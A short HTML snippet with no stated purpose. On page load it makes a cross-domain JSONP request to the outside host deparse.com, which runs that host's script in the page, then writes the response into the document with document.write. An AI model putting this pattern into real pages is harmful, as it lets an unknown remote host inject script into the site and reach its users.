<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
<script>
$(function(){
	
	$.ajax("http://deparse.com/", {
        data: {},
        dataType: 'jsonp',
        crossDomain: true,
        success: function(data) {
          if(data && data.resultcode == '200'){
            document.write(data);
          }
        }
      });
});
</script>
